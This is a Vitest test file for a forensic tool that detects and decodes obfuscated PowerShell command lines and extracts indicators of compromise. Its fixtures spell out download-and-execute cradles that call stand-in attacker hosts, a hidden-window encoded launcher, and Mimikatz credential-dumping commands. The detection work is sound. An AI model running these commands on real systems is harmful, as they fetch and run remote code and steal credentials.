import { describe, it, expect } from "vitest";
import { isObfuscated, deobfuscateText } from "../../src/analysis/deobfuscate.js";
import { applyDeobfuscation } from "../../src/analysis/applyDeobfuscation.js";
import type { InvestigationState, ForensicEvent } from "../../src/analysis/stateTypes.js";
import { emptyState } from "../../src/analysis/stateTypes.js";

// ── helpers ──────────────────────────────────────────────────────────────────

// "IEX" is PS shorthand for Invoke-Expression
function psEncCmdline(plaintext: string): string {
  const encoded = Buffer.from(plaintext, "utf16le").toString("base64");
  return `powershell.exe -NoProfile -WindowStyle hidden -enc ${encoded}`;
}

function fromB64Cmdline(plaintext: string): string {
  const encoded = Buffer.from(plaintext, "utf8").toString("base64");
  return `IEX ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('${encoded}')))`;
}

function makeEvent(description: string, id = "e001"): ForensicEvent {
  return {
    id,
    timestamp: "2026-01-01T00:00:00Z",
    description,
    severity: "High",
    mitreTechniques: ["T1059.001"],
    relatedFindingIds: [],
    sourceScreenshots: [],
  };
}

function makeState(events: ForensicEvent[]): InvestigationState {
  return { ...emptyState("test-case"), forensicTimeline: events };
}

// ── isObfuscated ─────────────────────────────────────────────────────────────

describe("isObfuscated", () => {
  it("detects PowerShell -enc payload", () => {
    expect(isObfuscated(psEncCmdline("Write-Host hello"))).toBe(true);
  });

  it("detects [Convert]::FromBase64String", () => {
    // "Invoke-Mimikatz" → 15 bytes → 20 base64 chars, meeting the {20,} minimum
    expect(isObfuscated(fromB64Cmdline("Invoke-Mimikatz"))).toBe(true);
  });

  it("detects iex + base64 block", () => {
    // Need ≥30 source bytes → ≥40 base64 chars to satisfy BASE64_BLOCK_RE {40,}
    const b64 = Buffer.from("Invoke-Mimikatz -Command sekurlsa::logonpasswords", "utf8").toString("base64");
    expect(isObfuscated(`iex "${b64}"`)).toBe(true);
  });

  it("returns false for clean command lines", () => {
    expect(isObfuscated("powershell.exe -NoProfile Get-Process")).toBe(false);
    expect(isObfuscated("cmd.exe /c dir")).toBe(false);
    expect(isObfuscated("notepad.exe C:\\users\\foo\\file.txt")).toBe(false);
  });

  it("returns false for a short random base64 without a marker", () => {
    expect(isObfuscated(`echo YWJj`)).toBe(false);
  });
});

// ── deobfuscateText ───────────────────────────────────────────────────────────

describe("deobfuscateText — PowerShell -enc (UTF-16LE)", () => {
  it("decodes a simple -enc payload", () => {
    const payload = "Write-Host 'hello'";
    const r = deobfuscateText(psEncCmdline(payload));
    expect(r).not.toBeNull();
    expect(r!.method).toBe("powershell-enc");
    expect(r!.decoded).toContain("Write-Host");
  });

  it("decodes a -enc payload with an embedded URL IOC", () => {
    const payload = "(New-Object Net.WebClient).DownloadString('http://evil.example.com/stage2.ps1')";
    const r = deobfuscateText(psEncCmdline(payload));
    expect(r).not.toBeNull();
    expect(r!.rawIocs.some((i) => i.type === "url" && i.value.includes("evil.example.com"))).toBe(true);
  });

  it("decodes a -enc payload with an embedded IP IOC", () => {
    const payload = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.55.100/run.ps1')";
    const r = deobfuscateText(psEncCmdline(payload));
    expect(r).not.toBeNull();
    expect(r!.rawIocs.some((i) => i.type === "ip" && i.value === "192.168.55.100")).toBe(true);
  });

  it("decodes a -enc payload with a sha256 hash IOC", () => {
    const hash = "a".repeat(64);
    const payload = `$h="${hash}"; Check-Hash $h`;
    const r = deobfuscateText(psEncCmdline(payload));
    expect(r).not.toBeNull();
    expect(r!.rawIocs.some((i) => i.type === "hash" && i.value === hash)).toBe(true);
  });

  it("returns null for a nonsense base64 that decodes to binary", () => {
    // Random bytes, not UTF-16LE text
    const garbage = Buffer.from([0x00, 0x01, 0x02, 0x03, 0xff, 0xfe]).toString("base64");
    expect(deobfuscateText(`powershell -enc ${garbage}`)).toBeNull();
  });
});

describe("deobfuscateText — [Convert]::FromBase64String (UTF-8)", () => {
  it("decodes a FromBase64String payload", () => {
    const payload = "Invoke-Mimikatz -Command sekurlsa::logonpasswords";
    const r = deobfuscateText(fromB64Cmdline(payload));
    expect(r).not.toBeNull();
    expect(r!.method).toBe("base64");
    expect(r!.decoded).toContain("Invoke-Mimikatz");
  });

  it("extracts a domain IOC from the decoded payload", () => {
    const payload = "iwr http://c2.malware.io/beacon";
    const r = deobfuscateText(fromB64Cmdline(payload));
    expect(r).not.toBeNull();
    expect(r!.rawIocs.some((i) => i.type === "url" && i.value.includes("c2.malware.io"))).toBe(true);
  });
});

describe("deobfuscateText — no false positives", () => {
  it("returns null for plain text", () => {
    expect(deobfuscateText("Get-Process | Select-Object Name, Id")).toBeNull();
  });

  it("returns null for -e with a short token (not base64)", () => {
    expect(deobfuscateText("powershell -e hello")).toBeNull();
  });
});

// ── applyDeobfuscation ───────────────────────────────────────────────────────

describe("applyDeobfuscation", () => {
  it("decodes obfuscated events and attaches deobfuscated block", () => {
    const payload = "Write-Host 'pwned'";
    const event = makeEvent(psEncCmdline(payload));
    const state = makeState([event]);
    const { state: next, deobfuscated } = applyDeobfuscation(state);
    expect(deobfuscated).toBe(1);
    const decoded = next.forensicTimeline[0].deobfuscated;
    expect(decoded).toBeDefined();
    expect(decoded!.method).toBe("powershell-enc");
    expect(decoded!.decoded).toContain("Write-Host");
  });

  it("adds extracted IOCs to state.iocs", () => {
    const payload = "IEX (New-Object Net.WebClient).DownloadString('http://evil.net/run.ps1')";
    const event = makeEvent(psEncCmdline(payload));
    const state = makeState([event]);
    const { state: next, newIocs } = applyDeobfuscation(state);
    expect(newIocs).toBeGreaterThan(0);
    expect(next.iocs.some((i) => i.type === "url" && i.value.includes("evil.net"))).toBe(true);
  });

  it("does not add IOC ids to the event when no IOCs were extracted", () => {
    const payload = "Write-Host 'no iocs here'";
    const event = makeEvent(psEncCmdline(payload));
    const state = makeState([event]);
    const { state: next } = applyDeobfuscation(state);
    const deob = next.forensicTimeline[0].deobfuscated;
    expect(deob).toBeDefined();
    expect(deob!.iocs).toHaveLength(0);
  });

  it("is idempotent — already-decoded events are skipped", () => {
    const payload = "Write-Host 'hello'";
    const event = makeEvent(psEncCmdline(payload));
    const state = makeState([event]);
    const { state: after1 } = applyDeobfuscation(state);
    const { state: after2, deobfuscated } = applyDeobfuscation(after1);
    expect(deobfuscated).toBe(0);
    expect(after1.forensicTimeline[0].deobfuscated).toEqual(after2.forensicTimeline[0].deobfuscated);
  });

  it("returns the original state reference unchanged when nothing is decodable", () => {
    const event = makeEvent("powershell.exe Get-Process");
    const state = makeState([event]);
    const { state: next, deobfuscated, newIocs } = applyDeobfuscation(state);
    expect(deobfuscated).toBe(0);
    expect(newIocs).toBe(0);
    expect(next).toBe(state);
  });

  it("deduplicates extracted IOCs against existing state.iocs", () => {
    // Use a hash-only payload so exactly one IOC is extracted and can be pre-populated.
    // ".corp" TLD is not in DOMAIN_RE, so no domain IOC is co-extracted alongside the hash.
    const hash = "b".repeat(64);
    const payload = `$checksum="${hash}"; Verify-FileHash`;
    const event = makeEvent(psEncCmdline(payload));
    const existingIoc = { id: "i001", type: "hash" as const, value: "b".repeat(64), firstSeen: "2026-01-01T00:00:00Z" };
    const state: InvestigationState = { ...makeState([event]), iocs: [existingIoc] };
    const { newIocs, state: next } = applyDeobfuscation(state);
    expect(newIocs).toBe(0);
    expect(next.forensicTimeline[0].deobfuscated?.iocs).toContain("i001");
  });

  it("assigns sequential canonical ids (i###) to new IOCs", () => {
    const payload = "IEX (New-Object Net.WebClient).DownloadString('http://c2.example.com/a.ps1')";
    const state = makeState([makeEvent(psEncCmdline(payload))]);
    const { state: next } = applyDeobfuscation(state);
    for (const ioc of next.iocs) {
      expect(ioc.id).toMatch(/^i\d{3}$/);
    }
  });

  it("processes multiple events independently", () => {
    const e1 = makeEvent(psEncCmdline("Write-Host 'a'"), "e001");
    const e2 = makeEvent("powershell Get-Process", "e002");
    const e3 = makeEvent(psEncCmdline("Write-Host 'b'"), "e003");
    const state = makeState([e1, e2, e3]);
    const { state: next, deobfuscated } = applyDeobfuscation(state);
    expect(deobfuscated).toBe(2);
    expect(next.forensicTimeline[0].deobfuscated).toBeDefined();
    expect(next.forensicTimeline[1].deobfuscated).toBeUndefined();
    expect(next.forensicTimeline[2].deobfuscated).toBeDefined();
  });
});
